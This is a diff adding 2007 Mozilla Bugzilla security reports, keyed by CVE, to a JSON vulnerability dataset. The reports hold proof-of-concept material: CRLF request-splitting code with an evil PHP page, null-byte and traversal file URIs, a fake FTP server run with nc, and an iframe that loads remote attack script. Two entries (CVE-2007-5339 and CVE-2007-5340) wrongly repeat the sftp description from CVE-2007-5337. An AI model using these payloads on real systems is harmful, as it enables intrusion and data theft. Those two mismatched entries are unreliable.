@@ -1,6 +1,209 @@
 {
   "year": 2007,
-  "total": 0,
+  "total": 30,
   "reference": "bugzilla.mozilla.org",
-  "reports": {}
+  "reports": {
+    "CVE-2007-0008": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=364319",
+        "title": "SSL2 client vulnerability in non-DEBUG builds",
+        "description": "This vulnerability was reported to security@mozilla.org by email from vendor-disclosure@idefense.com, bearing the subject IDEF1973. It says: \"This vulnerability was reported to iDefense by regenrecht.\" An SSL server cert with an RSA public key that is too small to encrypt the entire SSL2 \"Master Secret\" will cause optimized (not DEBUG) NSS builds to crash, and/or execute attacker-supplied code (on some platforms). Disabling SSL2 is a complete defense. Products with SSL2 disabled are believed to be invulnerable. The bug has been present in NSS since at least NSS 3.4 and probably longer. Function ssl_FormatSSL2Block starts with an assertion that the modulus is long enough to properly encode the data to be encrypted, but that only has effect in DEBUG builds. In non-DEBUG builds, when the modulus is too short, the code overruns the end of the too-short buffer. The fix is to detect too-short modulii in all builds, not just DEBUG builds. This probably should not be an ASSERT at all, but just a run time check."
+      }
+    ],
+    "CVE-2007-0009": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=364323",
+        "title": "SSL2 server vulnerability reported",
+        "description": "This vulnerability was reported to security@mozilla.org by email from vendor-disclosure@idefense.com, bearing the subject IDEF1994. It says: \"This vulnerability was reported to iDefense by regenrecht.\" According to the report, NSS \"may allow an attacker to cause a stack-based buffer overflow and execute arbitrary code on the affected application.\" The described attack occurs in SSL2 processing, in code executed only by processes acting as SSL2 servers. This vulnerability does not affect clients. Disabling SSL2 is believed to be a complete defense. Products with SSL2 disabled are believed to be not at risk from this vulnerability. As of this writihg, the bug is not yet confirmed. More details will be provided if/when it is confirmed."
+      }
+    ],
+    "CVE-2007-0776": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=360645",
+        "title": "Firefox 2.0 SVG \"_cairo_pen_init\" Heap Overflow",
+        "description": "User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.9a1) Gecko/20061113 Minefield/3.0a1 Build Identifier: Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.9a1) Gecko/20061113 Minefield/3.0a1 Firefox 2.0 SVG \"_cairo_pen_init\" Heap Overflow Versions Affected: Firefox 2.0 Platforms Affected: Apple Mac OSX 10.4 and prior Windows XP Linux Overview: When processing a specially crafted .svg file, this will cause firefox to crash. This allows for an attacker to cause firefox to crash, and or to execute arbitrary code (probably a tough one) on a targeted host. Technical Details: The following SVG code below will reproduce this issue: <clipPath stroke-width=\"2000000000000000\" color=\"1\" > <line> </line> </clipPath> Below is the crash when running firefox within gdb on OSX 10.4.7 Program received signal EXC_BAD_ACCESS, Could not access memory. Reason: KERN_INVALID_ADDRESS at address: 0x45b4f010 0x007d62c5 in _cairo_pen_init () (gdb) bt #0 0x007d62c5 in _cairo_pen_init () #1 0x00712635 in _cairo_gstate_stroke_extents () #2 0x0050e219 in cairo_stroke_extents () #3 0x004f30b0 in nsSVGCairoPathGeometry::GetCoveredRegion () #4 0x004f324d in nsSVGCairoPathGeometry::Update () #5 0x007ae1bc in nsSVGPathGeometryFrame::UpdateGraphic () #6 0x007ae3f2 in nsSVGPathGeometryFrame::NotifyRedrawUnsuspended () #7 0x006529ab in nsSVGDefsFrame::NotifyRedrawUnsuspended () #8 0x0069abee in nsSVGOuterSVGFrame::UnsuspendRedraw () #9 0x0069b121 in nsSVGOuterSVGFrame::DidReflow () #10 0x0063f84f in CanvasFrame::Reflow () #11 0x0044a58c in nsContainerFrame::ReflowChild () #12 0x00680234 in nsHTMLScrollFrame::ReflowScrolledFrame () #13 0x0068040a in nsHTMLScrollFrame::ReflowContents () #14 0x006820fe in nsHTMLScrollFrame::Reflow () -- snip -- Reproducible: Always"
+      }
+    ],
+    "CVE-2007-0778": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=347852",
+        "title": "reload leaks data from cache to end of page after hash collision in cache",
+        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6 On certain pages, when pressing F5, Firefox adds text from another page (from the cache?) to the end of the current page. Pressing Ctrl-F5 then shows the page as it should be. This problem does not occur in IE, or when the Firefox cache has been disabled. Reproducible: Always Steps to Reproduce: 1.Go to http://www.oldwings.nl/content/c47_yic/c47x.htm 2.Then go to http://www.oldwings.nl/content/c82_yic/c82x.htm 3.Go to the end of the page, everything is ok. 4.Now press F5 and voila, there is the garbage at the end of the page. 5.Press Ctrl-F5 and the garbage is gone. Actual Results: Showed garbage from the previous page after the end of the current page. Expected Results: It should not have shown the extra garbage at the end. I don't know why it is only this particular combination of pages that produces this. It appears to be related to the file name. The problem does NOT occur if you do this: 1.Go to http://www.oldwings.nl/content/c47_yic/xc47.htm 2.Then go to http://www.oldwings.nl/content/c82_yic/xc82.htm Pages are identical to the ones mentioned above, only the filename differs. Trying to disable the browser cache through meta tags does not help, I have yet to try adding HTTP headers. Also happens in Firefox 1.0.4 and can be reproduced as above. The garbage has also be seen by a friend using the Mozilla suite (version unknown), but it could not be reproduced using the above method."
+      }
+    ],
+    "CVE-2007-0780": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=354973",
+        "title": "Yet Another PopupBlocker XSS",
+        "description": "URI based window lookup is not safe for URIs such as data:, javascript:, etc... http://lxr.mozilla.org/seamonkey/search?string=requestingWindowURI steps: 1. make sure the popup blocker is enabled. 2. save the attached testcase to local disk or somewhere not B.M.O. this step is required to test the vulnerability correctly. 3. load the saved testcase. 4. open the blocked popup. Several weeks ago, my HDD crashed and I have lost some exploit testcases and mails :( ugh..."
+      }
+    ],
+    "CVE-2007-0802": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=367538",
+        "title": "Firefox Phishing Protection bypass",
+        "description": "User-Agent: Opera/9.10 (X11; Linux i686; U; en) Build Identifier: 2.0.0.1 for Linux and 2.0.0.1 for Windows XP It is possible to bypass Phishing Protection by add some characters to URL address. URL will be still valid and will work properly but we are not aware of Phishing warning. When we add \"/\" char at the end of domain in URL field - for Phishing Protection it will be another site than original and Phishing Protection Test will fail. Example: When my URL is on Phishing List: http://kaneda.bohater.net/phish.html - warning will be displayed http://kaneda.bohater.net//phish.html - warning will NOT be displayed Of course we can add more \"/\". Like live shows [Firefox HexEncoding Anti-Phishing bypass URL: http://sla.ckers.org/forum/read.php?13,2253 ] Phishers can use this technique in near future to abusive actions. Reproducible: Always Steps to Reproduce: 1. Open url with more /// in URL address which is added to Phishing BlackList 2. 3. Actual Results: FireFox dosnt display AntiPhishing warning. Expected Results: Its should display AntiPhishing warning"
+      }
+    ],
+    "CVE-2007-0981": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=370445",
+        "title": "embedded nulls in location.hostname confuse same-origin checks (Zalewski XSS vulnerability)",
+        "description": "Michal Zalewski sent the following mail to security@mozilla.org, full-disclosure and bugtraq: - - - - - - - - - - - - - - - - - - - - - There is a serious vulnerability in Mozilla Firefox, tested with 2.0.0.1, but quite certainly affecting all recent versions. The problem lies in how Firefox handles writes to the 'location.hostname' DOM property. It is possible for a script to set it to values that would not otherwise be accepted as a hostname when parsing a regular URL - including a string containing \\x00. Doing this prompts a peculiar behavior: internally, DOM string variables are not NUL-terminated, and as such, most of checks will consider 'evil.com\\x00foo.example.com' to be a part of *.example.com domain. The DNS resolver, however, and much of the remaining browser code, operates on ASCIZ strings native to C/C++ instead, treating the aforementioned example as 'evil.com'. This makes it possible for evil.com to modify location.hostname as described above, and have the resulting HTTP request still sent to evil.com. Once the new page is loaded, the attacker will be able to set cookies for *.example.com; he'll be also able to alter document.domain accordingly, in order to bypass the same-origin policy for XMLHttpRequest and cross-frame / cross-window data access. A quick demonstration is available here: http://lcamtuf.dione.cc/ffhostname.html If you want to confirm a successful exploitation, check Tools -> Options -> Privacy -> Show Cookies... for coredump.cx after the test; for the demo to succeed, the browser needs to have Javascript enabled, and must accept session cookies. The impact is quite severe: malicious sites can manipulate authentication cookies for third-party webpages, and, by the virtue of bypassing same-origin policy, can possibly tamper with the way these sites are displayed or how they work. Regards, /mz"
+      }
+    ],
+    "CVE-2007-1116": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=371375",
+        "title": "[FIX]Websites can test for URLs visited (pdp Firefox Cache Hack - Firefox History Hack redux)",
+        "description": "Subject: Firefox Cache Hack - Firefox History Hack redux From: \"pdp (architect)\" <pdp.gnucitizen@googlemail.com> To: full-disclosure@lists.grok.org.uk, bugtraq@securityfocus.com, \"WASC Forum\" <websecurity@webappsec.org> Date: Fri, 23 Feb 2007 12:32:29 +0000 Message-ID: <6905b1570702230432q5a0a5b7eq4839d709748f9b90@mail.gmail.com> http://www.gnucitizen.org/projects/hscan-redux/ [...] This vulnerability is not a reworked version of Jeremiah Grossman history hack. It is completely different and it should be treated as a new issue. The peculiar thing about this vulnerability is that it tells you which URLs you have attended during the current browser session (the last time you opened your browser). I am not sure how useful this is. Keep in mind that attackers can abuse this vulnerability in order to extract valuable information about your browsing habits. They can also use this hack to precisely detect whether you are logged into your router management interface. They can use this hack to detect your router type and version as well. Based on this information, they might be able to compromise the integrity of your network. The POC is located [... below]. If all checks show up as NOT visited, then visit one of the listed URLs and retest again. http://www.gnucitizen.org/projects/hscan-redux/poc.htm"
+      }
+    ],
+    "CVE-2007-1562": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=370559",
+        "title": "security problem handling responses to FTP PASV command",
+        "description": "Mail received by security@mozilla.org from \"mark\". Got lost in the spam, originally sent on Jan 29 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - The following bug affects Firefox 2.0.0.1. I believe it also affects previous versions. The format of this mail is based on the \"Guided\" bug report web page. Hardware platform ----------------- PC Operating System ---------------- Linux (but also tested on Windows XP) Build Identifier ---------------- Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1.1) Gecko/20070118 BonEcho/2.0.0.1 URL --- N/A Summary ------- Firefox security problem handling responses to FTP PASV command Details ------- During a normal FTP conversation between Firefox and an FTP server, Firefox will send the PASV command: PASV and the server will reply with an IP address and port number, e.g: 227 Entering Passive Mode (127,0,0,1,35,40) Firefox then connects to the IP and port provided to retrieve data from the FTP server (directory listing, file or whatever). So far this is normal behaviour for an FTP client. However, if the FTP server is malicious, it could send back an IP address other than its own. This causes Firefox to connect to the IP address and port chosen by the malicious FTP server. The impact of this is discussed in the \"Additional Information\" section below. Reproducability --------------- Happens every time. Steps to Reproduce ------------------ 1. Start a packet sniffer on the loopback interface, e.g: tcpdump -n -i lo 2. On the same host start a netcat listener on port 21: nc -v -n -l -p 21 3. On the same host open firefox and enter the URL: ftp://127.0.0.1/ 4. netcat should now show an incoming connection, e.g: # nc -v -n -l -p 21 listening on [any] 21 ... connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37209 5. You now need to send a series of FTP commands to firefox. In the netcat session, first send an FTP banner \"220 myftpserver\". After pressing ENTER firefox should send a login name. Reply with \"230 Login successful.\". Continue as shown in the instructions below (note that each response you need to send starts with 3 digits and the \"SEND:\" part should not be typed). SEND: 220 myftpserver RECV: USER anonymous SEND: 230 Login successful. RECV: SYST SEND: 215 UNIX Type: L8 RECV: PWD SEND: 257 \"/\" RECV: TYPE I SEND: 200 Switching to Binary mode. RECV: PASV SEND: 227 Entering Passive Mode (127,0,0,99,35,40) Now flick back to the packet sniffer you started in step 1. Upon sending of the \"227\" response above, you should see firefox try to connect to the address specified (127.0.0.99) - though this could have been any address (even one on a client's internal network). Actual Results -------------- Firefox connect to the IP address supplied by the (possibly malicious) FTP server. Expected Results ---------------- (IMHO) Firefox should ignore the IP address supplied by the FTP server in its PASV response. Here's my reasoning... In practice, the IP address sent in the PASV response (127,0,0,99 above) should always be the same IP address to which the client connected initially (i.e. 127.0.0.1 in the example above because the client connected to ftp://127.0.0.1). It therefore seem wise to ignore the IP address sent in the PASV response (127,0,0,99 above) and instead use the IP address the client connected to (127.0.0.1 above). This seems to be what Internet Explorer 6 and 7 do. Additional Information ---------------------- It is therefore possible for a malicious web page + malicious FTP server to cause Firefox to connect to arbitrary ports on arbitrary hosts - even ones on a client's internal network, and even ports on the banned list (http://www.mozilla.org/projects/netlib/PortBanning.html). Using JavaScript, it would be possible for the malicious website to have information like the following sent back out by firefox to an attacker: 127.0.0.1:22 returned banner: SSH-2.0-OpenSSH_4.5%0A 10.0.0.1:21 returned banner: 220%20%28vsFTPd%202.0.4%29%0A Note that javascript portscanning is not new. It well documented here: http://www.spidynamics.com/assets/documents/JSportscan.pdf The new security problems posed by the PASV problem are: - Bypassing of the banned ports list - Grabbing of banners from other network services as show above Please let me know if you need any further information. Regards, Mark"
+      }
+    ],
+    "CVE-2007-2292": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=378787",
+        "title": "IE 7 and Firefox Browsers Digest Authentication Request Splitting",
+        "description": "reported at the URL listed and mail to websecurity@webappsec.org by stefano.dipaola@wisec.it Title: IE 7 and Firefox Browsers Digest Authentication Original Discovery and Research: Stefano Di Paola Vulnerable: Internet Explorer 7.0.5730.11 Mozilla Firefox 2.0.0.3 Severity: Medium Vendor : http://www.microsoft.com/ http://www.mozilla.com/ Type of Vulnerability: HTTP Request Splitting Tested On : Firefox 2.0.0.3 under Windows XP SP2, Firefox 2.0.0.3 under Ubuntu 6.06, Internet Explorer SP2 under Windows XP SP2. Discovery Date : 20070213 Release Date : 20070425 I) Short description Firefox and Internet Explorer are prone to Http Request Splitting when Digest Authentication occurs. If anyone wants to know about HTTP Request Splitting, HTTP Request Splitting attacks are described in various papers and advisories: 1. http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf 2. http://www.webappsec.org/lists/websecurity/archive/2006-07/msg00069.html 3. http://download2.rapid7.com/r7-0026/ 4. http://www.wisec.it/docs.php?id=4 (PDF, About Auto Injection with Req.Split.) II) Long description As explained in Rfc2617 (http://www.ietf.org/rfc/rfc2617.txt) Digest Authentication is a more secure way to exchange user credentials. Rfc uses the following example: --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8< The first time the client requests the document, no Authorization header is sent, so the server responds with: HTTP/1.1 401 Unauthorized WWW-Authenticate: Digest realm=\"testrealm@host.com\", qop=\"auth,auth-int\", nonce=\"dcd98b7102dd2f0e8b11d0f600bfb0c093\", opaque=\"5ccc069c403ebaf9f0171e9517f40e41\" The client may prompt the user for the username and password, after which it will respond with a new request, including the following Authorization header: Authorization: Digest username=\"Mufasa\", realm=\"testrealm@host.com\", nonce=\"dcd98b7102dd2f0e8b11d0f600bfb0c093\", uri=\"/dir/index.html\", qop=auth, nc=00000001, cnonce=\"0a4f113b\", response=\"6629fae49393a05397450978507c4ef1\", opaque=\"5ccc069c403ebaf9f0171e9517f40e41\" --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8< So there's a response by the client (browser) with username in clear. There are two ways to send credentials in html/javascript: XMLHttpRequest(\"GET\",\"page\",async, \"user\",\"pass\"); And with img/iframes or related: <img src=\"http://user:pass@host/page\"> But what if the username contains \\r\\n or urlencoded %0d%0a? Let's use an Evil page like this: --8<-- http://evilhost/req.php --8<--8<--8<--8<--8<--8<--8< <?php header('Set-Cookie: PHPSESSID=6555'); if((int)intval($_COOKIE['PHPSESSID']) !== 6555){ header('HTTP/1.0 401 Authorization Required\"); header('WWW-Authenticate: Digest realm=\"1@example.com\", \\ qop=\"auth,auth-int\", nonce=\"dcd98b7102dd2f0e8b11d0f600bfb0c093\",\\ opaque=\"5ccc069c403ebaf9f0171e9517f40e41\"'); header('Proxy-Connection: keep-alive'); } else { // header(\"Set-Cookie: PHPSESSID=0\"); } header('Connection: keep-alive'); ?> <html><head> <meta http-equiv='Connection' content=\"keep-alive\"></head> <body><script> // Some Printing in order to show document DOM properties // in the poisoned page for(var i in document) document.write(i+' '+eval('document.'+i)+'<br>'); </script> </body> </html> --8<--8<--8<--8<--8<--8<--8<--8<--8<--8< Which asks for a digest authentication only once. III) Direct URL Authentication Let's try it with Firefox: <img src=\"http://user%0aname:pp@evilhost/req.php\"> Let's see what happens after the first request: --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8< HTTP/1.1 401 Authorization Required Set-Cookie: PHPSESSID=6555 WWW-Authenticate: Digest realm=\"1@example.com\", qop=\"auth,auth-int\",nonce=\"dcd98b7102dd2f0e8b11d0f600bfb0c093\", opaque=\"5ccc069c403ebaf9f0171e9517f40e41\" Proxy-Connection: keep-alive Connection: keep-alive, Keep-Alive Content-Length: 146 Keep-Alive: timeout=15, max=100 Content-Type: text/html; charset=UTF-8 ... --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8< and then Firefox resend its request: --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8< GET /req.php HTTP/1.1 Host: at.tack.er User-Agent: Mozilla/5.0 (X11; U; Linux i686; it; rv:1.8.1.3) Gecko/20060601 Firefox/2.0.0.3 (Ubuntu-edgy) Keep-Alive: 300 Connection: keep-alive Authorization: Digest username=\"user name\", realm=\"1@example.com\", nonce=\"dcd98b7102dd2f0e8b11d0f600bfb0c093\", uri=\"/req.php\", response=\"e398c5c7583b4ca115978c486bb766f8\", opaque=\"5ccc069c403ebaf9f0171e9517f40e41\", qop=auth, nc=00000001, cnonce=\"58e1c23271698745\" Cookie: PHPSESSID=6555 --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8< Everyone can see there's a splitting where the %0a was. The rest of the story is straightforward, an attacker could inject a second request, and in presence of a proxy (about 2 million people use it), a request splitting attack could be accomplished. IV) Firefox Add-On A redirection could be used: <img src=\"http://evilhost/redir.php\"> With redir.php : <?php header(\"Location: http://user%0aname:ds@avilhost/req.php\"); ?> Or by using various redirectors around the web. Note: Internet Explorer 7 is not vulnerable with imgs nor with other direct requests. V) XMLHttpRequest Authentication IE 7 and Firefox are both vulnerable. Let's use a standard request with XMLHttpRequest: --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<-- x=new XMLHttpRequest(); x.open(\"POST\",\"req.php?\",false,\"user\\r\\nname\",\"pass\"); x.setRequestHeader(\"Proxy-Connection\",\"keep-alive\"); x.onreadystatechange=function (){ if (x.readyState == 4){ } } // The payload with a request to a page with evil content x.send(\"RequestPayload\"); --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<-- This will result in a similar splitting like the one with images tags. What you could do with these splittings? A lot, for example in the presence of a proxy the local proxy cache could be poisoned. The previous references details this and other attacks. Note: there is some difference between IE and Firefox, but it'll be left as an exercise for the reader."
+      }
+    ],
+    "CVE-2007-3072": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=367428",
+        "title": "resource:// directory traversal",
+        "description": "resource://gre/../../../../boot.ini => Firefox can't find the file at /boot.ini. resource://gre/..\\..\\..\\..\\boot.ini => File loads successfully. This bug can be used to check existence of local files since resource:// and file:// have different restrictions. Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1.2pre) Gecko/20070117 BonEcho/2.0.0.2pre"
+      }
+    ],
+    "CVE-2007-3074": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=367428",
+        "title": "resource:// directory traversal",
+        "description": "resource://gre/../../../../boot.ini => Firefox can't find the file at /boot.ini. resource://gre/..\\..\\..\\..\\boot.ini => File loads successfully. This bug can be used to check existence of local files since resource:// and file:// have different restrictions. Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1.2pre) Gecko/20070117 BonEcho/2.0.0.2pre"
+      }
+    ],
+    "CVE-2007-3285": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=383478",
+        "title": "File type confusion vulnerability due to null bytes in URL (encoded as %00)",
+        "description": "Posted on 0x000000.com by Ronald van den Heetkamp Firefox Remote & Local Code Excution 0day. I found this vulnerability in Firefox moments ago while I was playing with the urlbar. It seems Firefox is vulnerable to null byte file type corruption. It is possible to execute files as a different filetype and trick Firefox into executing it. Is this dangerous? yeah it's pretty bad. Pointers that are vulnerable: file:/// resource: Use: [uri]/[filelocation]/[file][.ext]%00[.ext] Example: file:///C:/Program%20Files/Mozilla%20Firefox/firefox.exe%00.html or: resource:///README.txt%00.html More filetypes: file:///C:/Program%20Files/Mozilla%20Firefox/firefox.exe%00.html file:///C:/Program%20Files/Mozilla%20Firefox/firefox.exe%00.js file:///C:/Program%20Files/Mozilla%20Firefox/firefox.exe%00.pdf file:///C:/Program%20Files/Mozilla%20Firefox/firefox.exe%00.doc file:///C:/Program%20Files/Mozilla%20Firefox/firefox.exe%00.xls probably every filetype. Oh and: file:///C:/Program%20Files/Mozilla%20Firefox/firefox.exe%00.xpi :) This could lead to various exploits, to name a few: - Dossing a user, the above example does it almost. - Code execution - File access - Trojan activation - Virus activation - Reflective Cross Site Scripting (RXSS) - Cross Site Request Forgeries (CSRF) Another example It is possible to turn regular .txt stored files into full Javascript html zombies: file:///[filelocation]/troy.txt%00.html troy.txt could contain: /* Bunch of malicious Javascript */ Or: <html> <iframe name=\"bla\" src=\"http://www.0x000000.com/hacks/?troy.js\" width=\"100%\" height=\"900\"></iframe> </html> Well, I guess you get the point: nasty. Posted on 06 06 07 by 0x000000"
+      }
+    ],
+    "CVE-2007-3656": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=387333",
+        "title": "[FIX]unauthorized access to wyciwyg:// documents possible",
+        "description": "It is possible to access wyciwyg:// documents without proper same domain policy checks through the use of HTTP 302 redirects, as demonstrated here: http://lcamtuf.coredump.cx/ffcache/ This enables the attacker to: steal sensitive data displayed on dynamically generated pages; perform cache poisoning; and execute own code or display own content with URL bar and SSL certificate data of the attacked page (URL spoofing++). PS. It is also possible to access wyciwyg:// through XMLHttpRequest and IFRAMEd view-source:. Although proper access control seems to be more or less exercised, this seems to be not the intended effect, judging from comments in existing code; and the mechanism can be used by rogue sites to conveniently tag visitors regardless of cookie restrictions (write a unique ID to a wyciwyg:// file with document.write(), then do XMLHttpRequest on returning visitors), so you might want to tighten it."
+      }
+    ],
+    "CVE-2007-4041": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=389580",
+        "title": "some schemes with %00 launch unexpected handlers on windows",
+        "description": "On Windows XP some urls for \"web\" protocols that contain %00 launch the wrong handler and appear to be able to launch local programs, with limited argument passing. It is not yet clear that this can be used to compromise a machine but we can always fear the worst. The same behavior is observed using \"Run\" from the Windows Start menu for the affected protocols (http, https, ftp, gopher, telnet, mailto, news, snews, nttp, possibly others?). The behavior seems to be that if there's a %00 in the URL for these schemes then the URL Protocol handler is not called, instead the FileType handler is called based on the extension of the full url. The url is then passed to that File handler. For \"non-web\" URL handlers the URL is passed to the expected handler. In Firefox browser protocols are handled internally so are not vulnerable, but the mailnews protocols are handed off to the OS and can be abused in this way. The fix in bug 389106 mitigates the published testcases but doesn't actually \"fix\" the problem. http://xs-sniper.com/blog/remote-command-exec-firefox-2005/"
+      },
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=389106",
+        "title": "Escape URIs (especially quotes) when passing them to external protocol handlers",
+        "description": "different takes on this from different people, biesi has a patch for nsOSHelperAppService.cpp"
+      }
+    ],
+    "CVE-2007-4539": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=382056",
+        "title": "[SECURITY] Bugzilla::Webservice::Bug->get_bugs() doesn't check if the user is in the timetracking group when returning data",
+        "description": "While playing with contrib/bz_webservice_demo.pl, I realized that time related data are available even if you are logged out or logged in but not in the timetracking group. So it allows me to bypass some sec checks."
+      }
+    ],
+    "CVE-2007-4543": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=386942",
+        "title": "[SECURITY] User Agent text should be HTML escaped",
+        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.0; ja; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4 Build Identifier: At \"Enter A Bug\" page for Firefox, Default value of Build Identifier is User Agent text. But It is not HTML Escaped. Reproducible: Always Steps to Reproduce: 1.Chagnge User Agent text to contain \"> At Firefox, open about:config , and change general.useragent.extra.firefox to Firefox\">/2.0.0.4 2.Open https://bugzilla.mozilla.org/enter_bug.cgi?product=Firefox&format=guided 3.Check Build Identifier text 3. Actual Results: It is not HTML Escaped. Expected Results: It should be HTML escaped. I don't know this bug is XSS vulnerability or not. I this bug is not XSS vulnerability, there is no reason to keep Security flag on."
+      }
+    ],
+    "CVE-2007-5038": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=395632",
+        "title": "[SECURITY] XML-RPC WebService Bugzilla::User::offer_account_by_email does not check createemailregexp",
+        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6 Build Identifier: 3.0.1 Despite leaving createemailregexp parameter blank (disable account creation by email) it is possible to use Bugzilla::User::offer_account_by_email. Any other kind of reular expression in createemailregexp is ignored, too. It seems the value of createemailregexp is not checked. Reproducible: Always Steps to Reproduce: 1. set createemailregexp to whatever you like 2. fill appropriate values into the folowing python script import xmlrpclib server_proxy = xmlrpclib.ServerProxy( URL_TO_XMLRPCCGI ) server_proxy.User.offer_account_by_email( {'email':ANYMAILADDRESS} ) 3. run the script I already posted this issue on a newsgroup: news://news.mozilla.org:119/TpqdnR2hvJwq1HzbnZ2dnUVZ_qKgnZ2d@mozilla.org"
+      }
+    ],
+    "CVE-2007-5045": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=395942",
+        "title": "QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")",
+        "description": "This was reported at the URL in the URL field. QuickTime seems to have a flaw that allows specially crafted files handled by the plugin to launch the default browser with arbitrary parameters. The examples on that site use the QuickTime flaw to launch Firefox with \"-chrome javascript:<code>\" to execute arbitrary code, assuming your default browser is Firefox. The fix for bug 384384 would protect us in this case if QuickTime used the correct system APIs to launch the default browser, but they appear to read the .html file association from the registry and launch the browser directly. The QuickTime plugin should be fixed to a) not allow launching the default browser with arbitrary parameters and b) use the right API to launch the default browser (it's not really clear to me why it needs to do that anyways), but perhaps we can \"fix\" this particular case from our end. A cross-platform testcase is available at: http://people.mozilla.com/~gavin/bug/qt/test.mov It alerts \"Vulnerable\" if privileged code was allowed to run."
+      }
+    ],
+    "CVE-2007-5335": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=390983",
+        "title": "addMicrosummaryGenerator sidebar method can install from file URIs in content",
+        "description": "From what I can tell, this only opens up another way to get at bug 267645 (making the XHR throw an OOM from loading large files), which can be done through easier paths than this. Filing in sg just because it's late and I may have missed something other than that - if not we should at least close this up to maintain consistency with content policies/other sidebar methods. I'll fix this on trunk as part of bug 370242."
+      }
+    ],
+    "CVE-2007-5337": [
+      {
+        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=381146",
+        "title": "[FIX]sftp protocol allows file stealing under certain circumstances",
+        "description": "sftp protocol allows file stealing under certain circumstances SARVER is a ssh server with sftp and key auth enabled. luser is a (privileged user) that may connect to SARVER via sftp/ssh via key auth (~/.ssh/id_(r,d)sa empty passphrase and has SARVER in ~/.known_hosts) basically via sftp SARVER looks like a web server- note that the luser's private key gives him access to his private files - $HOME. attacker places sftp1.html on SARVER so that it is readadble by luser. URIs look like: [1] sftp://SARVER/tmp/sftp1.html [2] sftp://SARVER/home/luser/.bash_history [1] may read [2] via javascript. [1] may be loaded in iframe via anywhere in addition if luser's ssh settings do not strict host checking, sftp uris will send his user name and public key to ssh servers - this is similar to cookies, though such dumbness doesn't seem common."
+      }
+    ],
+    "CVE-2007-5339": [
+      {
+        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=309322,330563,341858,344064,348126,354645,361745,362901,378670,378682,379799,382376,384105,386382,386914,387033,387460,387844,391974,392285,393770,394014,394418",
+        "description": "sftp protocol allows file stealing under certain circumstances SARVER is a ssh server with sftp and key auth enabled. luser is a (privileged user) that may connect to SARVER via sftp/ssh via key auth (~/.ssh/id_(r,d)sa empty passphrase and has SARVER in ~/.known_hosts) basically via sftp SARVER looks like a web server- note that the luser's private key gives him access to his private files - $HOME. attacker places sftp1.html on SARVER so that it is readadble by luser. URIs look like: [1] sftp://SARVER/tmp/sftp1.html [2] sftp://SARVER/home/luser/.bash_history [1] may read [2] via javascript. [1] may be loaded in iframe via anywhere in addition if luser's ssh settings do not strict host checking, sftp uris will send his user name and public key to ssh servers - this is similar to cookies, though such dumbness doesn't seem common."
+      }
+    ],
+    "CVE-2007-5340": [
+      {
+        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=372309,387955,390078,393537",
+        "description": "sftp protocol allows file stealing under certain circumstances SARVER is a ssh server with sftp and key auth enabled. luser is a (privileged user) that may connect to SARVER via sftp/ssh via key auth (~/.ssh/id_(r,d)sa empty passphrase and has SARVER in ~/.known_hosts) basically via sftp SARVER looks like a web server- note that the luser's private key gives him access to his private files - $HOME. attacker places sftp1.html on SARVER so that it is readadble by luser. URIs look like: [1] sftp://SARVER/tmp/sftp1.html [2] sftp://SARVER/home/luser/.bash_history [1] may read [2] via javascript. [1] may be loaded in iframe via anywhere in addition if luser's ssh settings do not strict host checking, sftp uris will send his user name and public key to ssh servers - this is similar to cookies, though such dumbness doesn't seem common."
+      }
+    ],
